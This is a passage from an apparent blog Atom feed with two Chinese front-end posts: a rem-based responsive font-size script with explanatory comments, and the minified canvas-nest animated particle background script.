class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">```</span><br><span class="line">(function(win) &#123;</span><br><span class="line">    var remCalc = &#123;&#125;;</span><br><span class="line">    var docEl = win.document.documentElement,</span><br><span class="line">        tid;</span><br><span class="line"></span><br><span class="line">    function refreshRem() &#123;</span><br><span class="line">        // 获取当前窗口的宽度</span><br><span class="line">        var width = docEl.getBoundingClientRect().width;</span><br><span class="line">        // 大于640px 按640算</span><br><span class="line">        if (width &gt; 640) &#123; width = 640 &#125;</span><br><span class="line">        // 把窗口的宽度固定分为10份 也就是10rem </span><br><span class="line">        // 按视觉稿640算  640/10=64px  那么1rem = 64px</span><br><span class="line">        // 640视觉中 80px*80px的按钮 转换为rem  80/64 = 1.25rem</span><br><span class="line">        // 按钮的宽高固定为  1.25rem * 1.25rem</span><br><span class="line">        // 当窗口宽度缩放为 320px的时候</span><br><span class="line">        // 那么 1rem = 32px </span><br><span class="line">        // 原来 80px*80px的按钮现在变为 1.25rem * 32px = 40px</span><br><span class="line">        // 按钮变为 40px * 40px</span><br><span class="line">        // 其他宽度也类似</span><br><span class="line">        // </span><br><span class="line">        // cms做法也类似</span><br><span class="line">        // 只是我们把窗口宽度固定分为 6.4份，即6.4rem</span><br><span class="line">        // 所以 1rem = 100px</span><br><span class="line">        // 640视觉中 80px*80px的按钮 转换为rem  80/100 = 0.8rem</span><br><span class="line">        // ....其他也差不多</span><br><span class="line">        // </span><br><span class="line">        // </span><br><span class="line">        // 对比</span><br><span class="line">        // 其实也就是计算rem的问题 视觉稿量出来的值  除64 或 100的问题</span><br><span class="line">        // 除100 总比 除64 好口算</span><br><span class="line">        // 就算用sass写个 @function px2rem代替口算</span><br><span class="line">        // .8rem 总比输入 px2rem(80)少几个字符</span><br><span class="line">        // </span><br><span class="line">        // </span><br><span class="line">        var rem = width / 10;  // cms 只要把这行改成  var rem = width /640 * 100 </span><br><span class="line">        docEl.style.fontSize = rem + &quot;px&quot;;</span><br><span class="line">        remCalc.rem = rem;</span><br><span class="line">        //误差、兼容性处理</span><br><span class="line">        var actualSize = parseFloat(window.getComputedStyle(document.documentElement)[&quot;font-size&quot;]);</span><br><span class="line">        if (actualSize !== rem &amp;&amp; actualSize &gt; 0 &amp;&amp; Math.abs(actualSize - rem) &gt; 1) &#123;</span><br><span class="line">            var remScaled = rem * rem / actualSize;</span><br><span class="line">            docEl.style.fontSize = remScaled + &quot;px&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    //函数节流，避免频繁更新</span><br><span class="line">    function dbcRefresh() &#123;</span><br><span class="line">        clearTimeout(tid);</span><br><span class="line">        tid = setTimeout(refreshRem, 100)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    //窗口更新动态改变font-size</span><br><span class="line">    win.addEventListener(&quot;resize&quot;, function() &#123; dbcRefresh() &#125;, false);</span><br><span class="line"></span><br><span class="line">    //页面显示的时候再计算一次   难道切换窗口之后再切换来窗口大小会变?....</span><br><span class="line">    win.addEventListener(&quot;pageshow&quot;, function(e) &#123;</span><br><span class="line">        if (e.persisted) &#123; dbcRefresh() &#125;</span><br><span class="line">    &#125;, false);</span><br><span class="line">    refreshRem();</span><br><span class="line">    remCalc.refreshRem = refreshRem;</span><br><span class="line">    remCalc.rem2px = function(d) &#123;</span><br><span class="line">        var val = parseFloat(d) * this.rem;</span><br><span class="line">        if (typeof d === &quot;string&quot; &amp;&amp; d.match(/rem$/)) &#123; val += &quot;px&quot; &#125;</span><br><span class="line">        return val</span><br><span class="line">    &#125;;</span><br><span class="line">    remCalc.px2rem = function(d) &#123;</span><br><span class="line">        var val = parseFloat(d) / this.rem;</span><br><span class="line">        if (typeof d === &quot;string&quot; &amp;&amp; d.match(/px$/)) &#123; val += &quot;rem&quot; &#125;</span><br><span class="line">        return val</span><br><span class="line">    &#125;;</span><br><span class="line">    win.remCalc = remCalc</span><br><span class="line">&#125;)(window);</span><br></pre></td></tr></table></figure></h3>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
&lt;h1 id=&quot;什么叫做rem&quot;&gt;&lt;a href=&quot;#什么叫做rem&quot; class=&quot;headerlink&quot; title=&quot;什么叫做rem&quot;&gt;&lt;/a&gt;什么叫做rem&lt;/h1&gt;&lt;p&gt;REM是相对单位，是相对HTML根元素。&lt;br&gt;这个单位可谓集相对大小和绝对大小的优点于一身，通过它既可以做到只修改根元素就成比例地调整所有字体大小，又可以避免字体大小逐层复合的连锁反应。&lt;br&gt;目前，除了IE8及更早版本外，所有浏览器均已支持rem。&lt;/p&gt;
&lt;hr&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>一个很赞的背景效果:canvas-nest</title>
    <link href="http://yoursite.com/2018/02/26/%E4%B8%80%E4%B8%AA%E5%BE%88%E8%B5%9E%E7%9A%84%E8%83%8C%E6%99%AF%E6%95%88%E6%9E%9C-canvas-nest/"/>
    <id>http://yoursite.com/2018/02/26/一个很赞的背景效果-canvas-nest/</id>
    <published>2018-02-26T02:05:48.000Z</published>
    <updated>2018-02-26T02:10:47.597Z</updated>
    
    <content type="html"><![CDATA[<h6 id="一个很赞的背景效果-canvas-nest"><a href="#一个很赞的背景效果-canvas-nest" class="headerlink" title="一个很赞的背景效果-canvas-nest"></a>一个很赞的背景效果-canvas-nest</h6><a id="more"></a><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">!function () &#123;</span><br><span class="line">    function o(w, v, i) &#123;</span><br><span class="line">        return w.getAttribute(v) || i</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function j(i) &#123;</span><br><span class="line">        return document.getElementsByTagName(i)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function l() &#123;</span><br><span class="line">        var i = j(&quot;script&quot;), w = i.length, v = i[w - 1];</span><br><span class="line">        return &#123;l: w, z: o(v, &quot;zIndex&quot;, -1), o: o(v, &quot;opacity&quot;, 0.5), c: o(v, &quot;color&quot;, &quot;0,0,0&quot;), n: o(v, &quot;count&quot;, 99)&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function k() &#123;</span><br><span class="line">        r = u.width = window.innerWidth || document.documentElement.clientWidth || document.body.clientWidth, n = u.height = window.innerHeight || document.documentElement.clientHeight || document.body.clientHeight</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function b() &#123;</span><br><span class="line">        e.clearRect(0, 0, r, n);</span><br><span class="line">        var w = [f].concat(t);</span><br><span class="line">        var x, v, A, B, z, y;</span><br><span class="line">        t.forEach(function (i) &#123;</span><br><span class="line">            i.x += i.xa, i.y += i.ya, i.xa *= i.x &gt; r || i.x &lt; 0 ? -1 : 1, i.ya *= i.y &gt; n || i.y &lt; 0 ? -1 : 1, e.fillRect(i.x - 0.5, i.y - 0.5, 1, 1);</span><br><span class="line">            for (v = 0; v &lt; w.length; v++) &#123;</span><br><span class="line">                x = w[v];</span><br><span class="line">                if (i !== x &amp;&amp; null !== x.x &amp;&amp; null !== x.y) &#123;</span><br><span class="line">                    B = i.x - x.x, z = i.y - x.y, y = B * B + z * z;</span><br><span class="line">                    y &lt; x.max &amp;&amp; (x === f &amp;&amp; y &gt;= x.max / 2 &amp;&amp; (i.x -= 0.03 * B, i.y -= 0.03 * z), A = (x.max - y) / x.max, e.beginPath(), e.lineWidth = A / 2, e.strokeStyle = &quot;rgba(&quot; + s.c + &quot;,&quot; + (A + 0.2) + &quot;)&quot;, e.moveTo(i.x, i.y), e.lineTo(x.x, x.y), e.stroke())</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            w.splice(w.indexOf(i), 1)</span><br><span class="line">        &#125;), m(b)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    var u = document.createElement(&quot;canvas&quot;), s = l(), c = &quot;c_n&quot; + s.l, e = u.getContext(&quot;2d&quot;), r, n,</span><br><span class="line">        m = window.requestAnimationFrame || window.webkitRequestAnimationFrame || window.mozRequestAnimationFrame || window.oRequestAnimationFrame || window.msRequestAnimationFrame || function (i) &#123;</span><br><span class="line">            window.setTimeout(i, 1000 / 45)</span><br><span class="line">        &#125;, a = Math.random, f = &#123;x: null, y: null, max: 20000&#125;;</span><br><span class="line">    u.id = c;</span><br><span class="line">    u.style.cssText = &quot;position:fixed;top:0;left:0;z-index:&quot; + s.z + &quot;;opacity:&quot; + s.o;</span><br><span class="line">    j(&quot;body&quot;)[0].appendChild(u);</span><br><span class="line">    k(), window.onresize = k;</span><br><span class="line">    window.onmousemove = function (i) &#123;</span><br><span class="line">        i = i || window.event, f.x = i.clientX, f.y = i.clientY</span><br><span class="line">    &#125;, window.onmouseout = function () &#123;</span><br><span class="line">        f.x = null, f.y = null</span><br><span class="line">    &#125;;</span><br><span class="line">    for (var t = [], p = 0; s.n &gt; p; p++) &#123;</span><br><span class="line">        var h = a() * r, g = a() * n, q = 2 * a() - 1, d = 2 * a() - 1;</span><br><span class="line">        t.push(&#123;x: h, y: g, xa: q, ya: d, max: 6000&#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    setTimeout(function () &#123;</span><br><span class="line">        b()</span><br><span class="line">    &#125;, 100)</span><br><span class="line">&#125;();</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h6 id=&quot;一个很赞的背景效果-canvas-nest&quot;&gt;&lt;a href=&quot;#一个很赞的背景效果-canvas-nest&quot; class=&quot;headerlink&quot; title=&quot;一个很赞的背景效果-canvas-nest&quot;&gt;&lt;/a&gt;一个很赞的背景效果-canvas-nest&lt;/h6&gt;
    
    </summary>
    
    
  </entry>
  
</feed>
